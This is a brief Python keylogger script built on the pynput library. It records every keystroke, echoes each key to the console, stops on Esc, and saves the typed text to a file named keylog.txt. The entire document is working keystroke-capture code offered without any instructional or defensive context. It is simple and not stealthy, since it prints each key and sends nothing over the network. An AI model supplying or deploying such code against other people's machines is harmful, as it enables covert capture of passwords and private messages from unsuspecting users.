# Python Keylogger Script
from pynput.keyboard import Key, Listener

data = []

with open('keylog.txt','w',encoding='utf-8') as fin:
    # Define the function to log key presses
    
    def on_press(key):
        if key == Key.esc:
            raise Exception(key)
        try:
            data.append(key.char)
            print('alphanumeric key {0} pressed'.format(key.char))
        except AttributeError:
            if key == Key.backspace:
                data.pop()
            elif key == Key.space:
                data.append(' ')
            print('special key {0} pressed'.format(key))
        # print(data)

    # Set up the listener
    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except Exception as e:
            print('{0} was pressed'.format(e.args[0]))
            # print(repr(e))

    fin.write(''.join(data))

# key = self.listener.canonical(key)